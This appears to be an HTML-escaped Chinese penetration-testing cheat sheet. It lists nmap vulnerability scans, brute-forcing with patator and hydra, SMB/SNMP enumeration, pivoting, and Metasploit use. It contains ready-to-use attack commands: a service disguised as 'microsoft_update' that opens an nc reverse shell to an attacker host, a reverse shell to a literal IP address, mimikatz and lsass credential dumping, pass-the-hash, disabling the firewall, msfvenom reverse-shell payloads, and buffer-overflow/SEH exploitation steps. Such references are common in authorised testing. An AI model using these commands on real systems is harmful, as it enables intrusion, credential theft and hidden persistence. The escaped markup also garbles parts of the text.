nmap -sS -sV &amp;ndash;script=vulscan/vulscan.nse target&lt;br /&gt;
nmap -sS -sV &amp;ndash;script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target&lt;br /&gt;
nmap -sS -sV &amp;ndash;script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target&lt;br /&gt;
nmap -PN -sS -sV &amp;ndash;script=vulscan –script-args vulscancorrelation=1 -p80 target&lt;br /&gt;
nmap -sV &amp;ndash;script=vuln target&lt;br /&gt;
nmap -PN -sS -sV &amp;ndash;script=all –script-args vulscancorrelation=1 target&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 DIRB 爆破目录  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注：DIRB 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑等等。&lt;/p&gt;

&lt;p&gt;dirb &lt;a href=&#34;http://IP:PORT&#34; target=&#34;_blank&#34;&gt;http://IP:PORT&lt;/a&gt; /usr/share/dirb/wordlists/common.txt&lt;/p&gt;

&lt;p&gt;Patator – 全能暴力破解测试工具&lt;/p&gt;

&lt;h1 id=&#34;git-clone-https-github-com-lanjelot-patator-git-usr-share-patator&#34;&gt;git clone &lt;a href=&#34;https://github.com/lanjelot/patator.git&#34; target=&#34;_blank&#34;&gt;https://github.com/lanjelot/patator.git&lt;/a&gt; /usr/share/patator&lt;/h1&gt;

&lt;h1 id=&#34;smtp-爆破&#34;&gt;SMTP 爆破&lt;/h1&gt;

&lt;p&gt;$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst&lt;br /&gt;
$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst&lt;br /&gt;
$ patator smtp_login host=192.168.17.129 helo=&amp;lsquo;ehlo 192.168.17.128&amp;rsquo; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst&lt;br /&gt;
$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&amp;lsquo;incorrect password or account name&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 Fierce 爆破 DNS  

注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：subDomainsBrute 和 SubBrute 等等  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;http-ha-ckers-org-fierce&#34;&gt;&lt;a href=&#34;http://ha.ckers.org/fierce/&#34; target=&#34;_blank&#34;&gt;http://ha.ckers.org/fierce/&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;$ ./fierce.pl -dns example.com&lt;br /&gt;
$ ./fierce.pl –dns example.com –wordlist myWordList.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 Nikto 扫描 Web 服务  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nikto -C all -h &lt;a href=&#34;http://IP&#34; target=&#34;_blank&#34;&gt;http://IP&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;扫描 WordPress  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;git clone &lt;a href=&#34;https://github.com/wpscanteam/wpscan.git&#34; target=&#34;_blank&#34;&gt;https://github.com/wpscanteam/wpscan.git&lt;/a&gt; &amp;amp;&amp;amp; cd wpscan&lt;br /&gt;
./wpscan –url &lt;a href=&#34;http://IP/&#34; target=&#34;_blank&#34;&gt;http://IP/&lt;/a&gt; –enumerate p&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;HTTP 指纹识别  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;wget &lt;a href=&#34;http://www.net-square.com/_assets/httprint_linux_301.zip&#34; target=&#34;_blank&#34;&gt;http://www.net-square.com/_assets/httprint_linux_301.zip&lt;/a&gt; &amp;amp;&amp;amp; unzip httprint_linux_301.zip&lt;br /&gt;
cd httprint_301/linux/&lt;br /&gt;
./httprint -h &lt;a href=&#34;http://IP&#34; target=&#34;_blank&#34;&gt;http://IP&lt;/a&gt; -s signatures.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 Skipfish 扫描  

注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u &lt;a href=&#34;http://IP&#34; target=&#34;_blank&#34;&gt;http://IP&lt;/a&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 NC 扫描  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nc -v -w 1 target -z 1-1000&lt;br /&gt;
for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Unicornscan  

注：Unicornscan 是一个信息收集和安全审计的工具。  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;us -H -msf -Iv 192.168.56.101 -p 1-65535&lt;br /&gt;
us -H -mU -Iv 192.168.56.101 -p 1-65535&lt;/p&gt;

&lt;p&gt;-H 在生成报告阶段解析主机名&lt;br /&gt;
-m 扫描类型 (sf - tcp, U - udp)&lt;br /&gt;
-Iv - 详细&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 Xprobe2 识别操作系统指纹  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;xprobe2 -v -p tcp:80:open IP&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;枚举 Samba  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nmblookup -A target&lt;br /&gt;
smbclient //MOUNT/share -I target -N&lt;br /&gt;
rpcclient -U &amp;ldquo;&amp;rdquo; target&lt;br /&gt;
enum4linux target&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;枚举 SNMP  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;snmpget -v 1 -c public IP&lt;br /&gt;
snmpwalk -v 1 -c public IP&lt;br /&gt;
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;实用的 Windows cmd 命令  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;net localgroup Users&lt;br /&gt;
net localgroup Administrators&lt;br /&gt;
search dir/s *.doc&lt;br /&gt;
system(&amp;ldquo;start cmd.exe /k $cmd&amp;rdquo;)&lt;br /&gt;
sc create microsoft_update binpath=&amp;ldquo;cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe&amp;rdquo; start= auto error= ignore&lt;br /&gt;
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779&lt;br /&gt;
mimikatz.exe &amp;ldquo;privilege::debug&amp;rdquo; &amp;ldquo;log&amp;rdquo; &amp;ldquo;sekurlsa::logonpasswords&amp;rdquo;&lt;br /&gt;
Procdump.exe -accepteula -ma lsass.exe lsass.dmp&lt;br /&gt;
mimikatz.exe &amp;ldquo;sekurlsa::minidump lsass.dmp&amp;rdquo; &amp;ldquo;log&amp;rdquo; &amp;ldquo;sekurlsa::logonpasswords&amp;rdquo;&lt;br /&gt;
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统&lt;br /&gt;
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PuTTY 连接隧道  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;转发远程端口到目标地址&lt;br /&gt;
plink.exe -P 22 -l root -pw &amp;ldquo;1234&amp;rdquo; -R 445:127.0.0.1:445 IP&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Meterpreter 端口转发  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-www-offensive-security-com-metasploit-unleashed-portfwd&#34;&gt;&lt;a href=&#34;https://www.offensive-security.com/metasploit-unleashed/portfwd/&#34; target=&#34;_blank&#34;&gt;https://www.offensive-security.com/metasploit-unleashed/portfwd/&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;转发远程端口到目标地址&#34;&gt;转发远程端口到目标地址&lt;/h1&gt;

&lt;p&gt;meterpreter &amp;gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141&lt;br /&gt;
kali &amp;gt; rdesktop 127.0.0.1:3389&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;开启 RDP 服务  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;reg add &amp;ldquo;hklm\system\currentcontrolset\control\terminal server&amp;rdquo; /f /v fDenyTSConnections /t REG_DWORD /d 0&lt;br /&gt;
netsh firewall set service remoteadmin enable&lt;br /&gt;
netsh firewall set service remotedesktop enable&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;关闭 Windows 防火墙  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;netsh firewall set opmode disable&lt;/p&gt;

&lt;p&gt;Meterpreter VNC\RDP&lt;/p&gt;

&lt;h1 id=&#34;https-www-offensive-security-com-metasploit-unleashed-enabling-remote-desktop&#34;&gt;&lt;a href=&#34;https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/&#34; target=&#34;_blank&#34;&gt;https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;run getgui -u admin -p 1234&lt;br /&gt;
run vnc -p 5043&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 Mimikatz  

获取 Windows 明文用户名密码  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;git clone &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz.git&#34; target=&#34;_blank&#34;&gt;https://github.com/gentilkiwi/mimikatz.git&lt;/a&gt;&lt;br /&gt;
privilege::debug&lt;br /&gt;
sekurlsa::logonPasswords full&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;获取哈希值  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;git clone &lt;a href=&#34;https://github.com/byt3bl33d3r/pth-toolkit&#34; target=&#34;_blank&#34;&gt;https://github.com/byt3bl33d3r/pth-toolkit&lt;/a&gt;&lt;br /&gt;
pth-winexe -U hash //IP cmd&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;或者  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;apt-get install freerdp-x11&lt;br /&gt;
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;在或者  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;meterpreter &amp;gt; run post/windows/gather/hashdump&lt;br /&gt;
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::&lt;br /&gt;
msf &amp;gt; use exploit/windows/smb/psexec&lt;br /&gt;
msf exploit(psexec) &amp;gt; set payload windows/meterpreter/reverse_tcp&lt;br /&gt;
msf exploit(psexec) &amp;gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c&lt;br /&gt;
msf exploit(psexec) &amp;gt; exploit&lt;br /&gt;
meterpreter &amp;gt; shell&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 Hashcat 破解密码  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;hashcat -m 400 -a 0 hash /root/rockyou.txt&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 NC 抓取 Banner 信息  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;nc 192.168.0.10 80&lt;br /&gt;
GET / HTTP/1.1&lt;br /&gt;
Host: 192.168.0.10&lt;br /&gt;
User-Agent: Mozilla/4.0&lt;br /&gt;
Referrer: www.example.com&lt;br /&gt;
&lt;enter&gt;&lt;br /&gt;
&lt;enter&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 NC 在 Windows 上反弹 shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;c:&amp;gt;nc -Lp 31337 -vv -e cmd.exe&lt;br /&gt;
nc 192.168.0.10 31337&lt;br /&gt;
c:&amp;gt;nc example.com 80 -e cmd.exe&lt;br /&gt;
nc -lp 80&lt;/p&gt;

&lt;p&gt;nc -lp 31337 -e /bin/bash&lt;br /&gt;
nc 192.168.0.10 31337&lt;br /&gt;
nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;查找 SUID\SGID root 文件  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;查找-suid-root-文件&#34;&gt;查找 SUID root 文件&lt;/h1&gt;

&lt;p&gt;find / -user root -perm -4000 -print&lt;/p&gt;

&lt;h1 id=&#34;查找-sgid-root-文件&#34;&gt;查找 SGID root 文件:&lt;/h1&gt;

&lt;p&gt;find / -group root -perm -2000 -print&lt;/p&gt;

&lt;h1 id=&#34;查找-suid-和-sgid-文件&#34;&gt;查找 SUID 和 SGID 文件:&lt;/h1&gt;

&lt;p&gt;find / -perm -4000 -o -perm -2000 -print&lt;/p&gt;

&lt;h1 id=&#34;查找不属于任何用户的文件&#34;&gt;查找不属于任何用户的文件:&lt;/h1&gt;

&lt;p&gt;find / -nouser -print&lt;/p&gt;

&lt;h1 id=&#34;查找不属于任何用户组的文件&#34;&gt;查找不属于任何用户组的文件:&lt;/h1&gt;

&lt;p&gt;find / -nogroup -print&lt;/p&gt;

&lt;h1 id=&#34;查找软连接及其指向&#34;&gt;查找软连接及其指向:&lt;/h1&gt;

&lt;p&gt;find / -type l -ls&lt;/p&gt;

&lt;p&gt;Python shell&lt;/p&gt;

&lt;p&gt;python -c &amp;lsquo;import pty;pty.spawn(&amp;ldquo;/bin/bash&amp;rdquo;)&amp;rsquo;&lt;/p&gt;

&lt;p&gt;Python\Ruby\PHP HTTP 服务器&lt;/p&gt;

&lt;p&gt;python2 -m SimpleHTTPServer&lt;br /&gt;
python3 -m http.server&lt;br /&gt;
ruby -rwebrick -e &amp;ldquo;WEBrick::HTTPServer.new(:Port =&amp;gt; 8888, :D&lt;br /&gt;
 ocumentRoot =&amp;gt; Dir.pwd).start&amp;rdquo;&lt;br /&gt;
php -S 0.0.0.0:8888&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;获取进程对应的 PID  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;fuser -nv tcp 80&lt;br /&gt;
fuser -k -n tcp 80&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 Hydra 爆破 RDP  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;挂载远程 Windows 共享文件夹  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw&lt;/p&gt;

&lt;p&gt;Kali 下编译 Exploit&lt;/p&gt;

&lt;p&gt;gcc -m32 -o output32 hello.c (32 位)&lt;br /&gt;
gcc -m64 -o output hello.c (64 位)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Kali 下编译 Windows Exploit  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;wget -O mingw-get-setup.exe &lt;a href=&#34;http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download&#34; target=&#34;_blank&#34;&gt;http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download&lt;/a&gt;&lt;br /&gt;
wine mingw-get-setup.exe&lt;br /&gt;
select mingw32-base&lt;br /&gt;
cd /root/.wine/drive_c/windows&lt;br /&gt;
wget &lt;a href=&#34;http://gojhonny.com/misc/mingw_bin.zip&#34; target=&#34;_blank&#34;&gt;http://gojhonny.com/misc/mingw_bin.zip&lt;/a&gt; &amp;amp;&amp;amp; unzip mingw_bin.zip&lt;br /&gt;
cd /root/.wine/drive_c/MinGW/bin&lt;br /&gt;
wine gcc -o ability.exe /tmp/exploit.c -lwsock32&lt;br /&gt;
wine ability.exe&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;NASM 命令  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。&lt;/p&gt;

&lt;p&gt;nasm -f bin -o payload.bin payload.asm&lt;br /&gt;
nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SSH 穿透  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ssh -D 127.0.0.1:1080 -p 22 user@IP&lt;br /&gt;
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf&lt;br /&gt;
proxychains commands target&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SSH 穿透从一个网络到另一个网络  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ssh -D 127.0.0.1:1080 -p 22 user1@IP1&lt;br /&gt;
Add socks4 127.0.0.1 1080 in /etc/proxychains.conf&lt;br /&gt;
proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2&lt;br /&gt;
Add socks4 127.0.0.1 1081 in /etc/proxychains.conf&lt;br /&gt;
proxychains commands target&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;使用 metasploit 进行穿透  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;route add X.X.X.X 255.255.255.0 1&lt;br /&gt;
use auxiliary/server/socks4a&lt;br /&gt;
run&lt;br /&gt;
proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;或者  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-www-offensive-security-com-metasploit-unleashed-pivoting-1&#34;&gt;&lt;a href=&#34;https://www.offensive-security.com/metasploit-unleashed/pivoting/&#34; target=&#34;_blank&#34;&gt;https://www.offensive-security.com/metasploit-unleashed/pivoting/&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;meterpreter &amp;gt; ipconfig&lt;br /&gt;
IP Address  : 10.1.13.3&lt;br /&gt;
meterpreter &amp;gt; run autoroute -s 10.1.13.0/24&lt;br /&gt;
meterpreter &amp;gt; run autoroute -p&lt;br /&gt;
10.1.13.0          255.255.255.0      Session 1&lt;br /&gt;
meterpreter &amp;gt; Ctrl+Z&lt;br /&gt;
msf auxiliary(tcp) &amp;gt; use exploit/windows/smb/psexec&lt;br /&gt;
msf exploit(psexec) &amp;gt; set RHOST 10.1.13.2&lt;br /&gt;
msf exploit(psexec) &amp;gt; exploit&lt;br /&gt;
meterpreter &amp;gt; ipconfig&lt;br /&gt;
IP Address  : 10.1.13.2&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;基于 CSV 文件查询 Exploit-DB  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;git clone &lt;a href=&#34;https://github.com/offensive-security/exploit-database.git&#34; target=&#34;_blank&#34;&gt;https://github.com/offensive-security/exploit-database.git&lt;/a&gt;&lt;br /&gt;
cd exploit-database&lt;br /&gt;
./searchsploit –u&lt;br /&gt;
./searchsploit apache 2.2&lt;br /&gt;
./searchsploit &amp;ldquo;Linux Kernel&amp;rdquo;&lt;/p&gt;

&lt;p&gt;cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &amp;ldquo;&amp;lt;|&amp;lt;=&amp;rdquo; | sort -k3&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF Payloads  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &amp;gt; system.exe&lt;br /&gt;
msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &amp;gt; exploit.php&lt;br /&gt;
msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 &amp;ndash;platform win -f asp -o file.asp&lt;br /&gt;
msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &amp;ldquo;\x00&amp;rdquo; -a x86 &amp;ndash;platform win -f c&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成在 Linux 下反弹的 Meterpreter Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 &amp;ndash;platform linux -o shell&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 Shell (C Shellcode)  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &amp;ldquo;\x00\x0a\x0d&amp;rdquo; -a x86 &amp;ndash;platform win -f c&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 Python Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 ASP Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 &amp;ndash;platform win -o shell.asp&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 Bash Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 PHP Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php&lt;br /&gt;
add &amp;lt;?php at the beginning&lt;br /&gt;
perl -i~ -0777pe&amp;rsquo;s/^/&amp;lt;?php \n/&amp;rsquo; shell.php&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;MSF 生成反弹 Win Shell  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 &amp;ndash;platform win -o shell.exe&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Linux 常用安全命令  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;使用-uid-查找对应的程序-1&#34;&gt;使用 uid 查找对应的程序&lt;/h1&gt;

&lt;p&gt;find / -uid 0 -perm -4000&lt;/p&gt;

&lt;h1 id=&#34;查找哪里拥有写权限-1&#34;&gt;查找哪里拥有写权限&lt;/h1&gt;

&lt;p&gt;find / -perm -o=w&lt;/p&gt;

&lt;h1 id=&#34;查找名称中包含点和空格的文件-1&#34;&gt;查找名称中包含点和空格的文件&lt;/h1&gt;

&lt;p&gt;find / -name &amp;ldquo; &amp;rdquo; -print&lt;br /&gt;
find / -name &amp;ldquo;..&amp;rdquo; -print&lt;br /&gt;
find / -name &amp;ldquo;. &amp;rdquo; -print&lt;br /&gt;
find / -name &amp;ldquo; &amp;rdquo; -print&lt;/p&gt;

&lt;h1 id=&#34;查找不属于任何人的文件-1&#34;&gt;查找不属于任何人的文件&lt;/h1&gt;

&lt;p&gt;find / -nouser&lt;/p&gt;

&lt;h1 id=&#34;查找未链接的文件-1&#34;&gt;查找未链接的文件&lt;/h1&gt;

&lt;p&gt;lsof +L1&lt;/p&gt;

&lt;h1 id=&#34;获取进程打开端口的信息-1&#34;&gt;获取进程打开端口的信息&lt;/h1&gt;

&lt;p&gt;lsof -i&lt;/p&gt;

&lt;h1 id=&#34;看看-arp-表中是否有奇怪的东西-1&#34;&gt;看看 ARP 表中是否有奇怪的东西&lt;/h1&gt;

&lt;p&gt;arp -a&lt;/p&gt;

&lt;h1 id=&#34;查看所有账户-1&#34;&gt;查看所有账户&lt;/h1&gt;

&lt;p&gt;getent passwd&lt;/p&gt;

&lt;h1 id=&#34;查看所有用户组-1&#34;&gt;查看所有用户组&lt;/h1&gt;

&lt;p&gt;getent group&lt;/p&gt;

&lt;h1 id=&#34;列举所有用户的-crontabs-1&#34;&gt;列举所有用户的 crontabs&lt;/h1&gt;

&lt;p&gt;for user in $(getent passwd|cut -f1 -d:); do echo &amp;ldquo;### Crontabs for $user ####&amp;rdquo;; crontab -u $user -l; done&lt;/p&gt;

&lt;h1 id=&#34;生成随机密码-1&#34;&gt;生成随机密码&lt;/h1&gt;

&lt;p&gt;cat /dev/urandom| tr -dc ‘a-zA-Z0-9-&lt;em&gt;!@#$%^&amp;amp;*()&lt;/em&gt;+{}|:&amp;lt;&amp;gt;?=’|fold -w 12| head -n 4&lt;/p&gt;

&lt;h1 id=&#34;查找所有不可修改的文件-1&#34;&gt;查找所有不可修改的文件&lt;/h1&gt;

&lt;p&gt;find . | xargs -I file lsattr -a file 2&amp;gt;/dev/null | grep ‘^….i’&lt;/p&gt;

&lt;h1 id=&#34;使文件不可修改-1&#34;&gt;使文件不可修改&lt;/h1&gt;

&lt;p&gt;chattr -i file&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Windows 缓冲区溢出利用命令  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom -p windows/shell_bind_tcp -a x86 &amp;ndash;platform win -b &amp;ldquo;\x00&amp;rdquo; -f c&lt;br /&gt;
msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 &amp;ndash;platform win -e x86/shikata_ga_nai -b &amp;ldquo;\x00&amp;rdquo; -f c&lt;/p&gt;

&lt;p&gt;COMMONLY USED BAD CHARACTERS:&lt;br /&gt;
\x00\x0a\x0d\x20                              For http request&lt;br /&gt;
\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)&lt;/p&gt;

&lt;h1 id=&#34;常用命令-1&#34;&gt;常用命令:&lt;/h1&gt;

&lt;p&gt;pattern create&lt;br /&gt;
pattern offset (EIP Address)&lt;br /&gt;
pattern offset (ESP Address)&lt;br /&gt;
add garbage upto EIP value and add (JMP ESP address) in EIP . (ESP = shellcode )&lt;/p&gt;

&lt;p&gt;!pvefindaddr pattern_create 5000&lt;br /&gt;
!pvefindaddr suggest&lt;br /&gt;
!pvefindaddr modules&lt;br /&gt;
!pvefindaddr nosafeseh&lt;/p&gt;

&lt;p&gt;!mona config -set workingfolder C:\Mona\%p&lt;br /&gt;
!mona config -get workingfolder&lt;br /&gt;
!mona mod&lt;br /&gt;
!mona bytearray -b &amp;ldquo;\x00\x0a&amp;rdquo;&lt;br /&gt;
!mona pc 5000&lt;br /&gt;
!mona po EIP&lt;br /&gt;
!mona suggest&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SEH – 结构化异常处理  

注：SEH(“Structured Exception Handling”)，即结构化异常处理，是 windows 操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-en-wikipedia-org-wiki-microsoft-specific-exception-handling-mechanisms-seh-1&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH&lt;/a&gt;&lt;/h1&gt;

&lt;h1 id=&#34;http-baike-baidu-com-view-243131-htm-1&#34;&gt;&lt;a href=&#34;http://baike.baidu.com/view/243131.htm&#34; target=&#34;_blank&#34;&gt;http://baike.baidu.com/view/243131.htm&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;!mona suggest&lt;br /&gt;
!mona nosafeseh&lt;br /&gt;
nseh=&amp;rdquo;\xeb\x06\x90\x90&amp;rdquo; (next seh chain)&lt;br /&gt;
iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ROP (DEP)  

注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。  

DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。  
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;https-en-wikipedia-org-wiki-return-oriented-programming-1&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Return-oriented_programming&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Return-oriented_programming&lt;/a&gt;&lt;/h1&gt;

